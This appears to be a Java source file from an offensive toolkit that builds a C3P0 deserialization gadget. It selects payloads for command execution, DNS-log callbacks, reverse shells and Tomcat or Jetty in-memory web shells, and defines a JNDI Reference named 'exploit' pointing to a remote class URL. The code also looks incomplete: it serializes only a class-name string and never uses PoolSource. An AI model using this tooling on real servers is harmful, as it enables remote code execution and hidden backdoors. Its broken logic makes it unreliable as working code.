package com.aurora.Gadgets;

import com.aurora.SupportType.PayloadType;
import com.aurora.Templates.*;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;



public class C3P0 {
    public static Object getObject(PayloadType type, String... param) throws Exception{
        String className;
        switch (type){
            case command:
                CommandTemplate commandTemplate = new CommandTemplate(param[0]);
                commandTemplate.cache();
                className = commandTemplate.getClassName();
                break;
            case dnslog:
                DnslogTemplate dnslogTemplate = new DnslogTemplate(param[0]);
                dnslogTemplate.cache();
                className = dnslogTemplate.getClassName();
                break;
            case reverseshell:
                ReverseShellTemplate reverseShellTemplate = new ReverseShellTemplate(param[0], param[1]);
                reverseShellTemplate.cache();
                className = reverseShellTemplate.getClassName();
                break;
            case tomcatecho:
                className = TomcatEchoTemplate.class.getName();
                break;
            case tomcatmemshell1:
                className = TomcatMemshellTemplate1.class.getName();
                break;
            case tomcatmemshell2:
                className = TomcatMemshellTemplate2.class.getName();
                break;
            case jettymemshell:
                className = JettyMemshellTemplate.class.getName();
                break;
            default:
                throw new IllegalStateException("Unexpected value: " + type);
        }
        return className;
    }
    public static byte[] getBytes(PayloadType type, String... param) throws Exception {

        Object b = getObject(type,param);
        //?????????
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baous);
        oos.writeObject(b);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }


    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private String className;
        private String url;

        public PoolSource ( String className, String url ) {
            this.className = className;
            this.url = url;
        }

        public Reference getReference () throws NamingException {
            return new Reference("exploit", this.className, this.url);
        }

        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
        public PooledConnection getPooledConnection () throws SQLException {return null;}
        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}
    }
}
